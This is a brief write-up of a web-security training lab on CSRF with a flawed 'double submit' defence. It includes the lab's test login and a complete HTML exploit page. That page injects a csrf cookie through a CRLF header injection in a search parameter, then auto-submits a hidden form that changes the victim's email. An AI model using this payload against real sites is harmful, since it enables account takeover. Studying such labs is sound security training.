This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

---

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/my-account/change-email" method="post">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="hacked">
        </form>

        <img src="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

The App doesn't have a secure CSRF. Any value can be used to change the email:

![[IMG/Pasted image 20240924084521.png]]

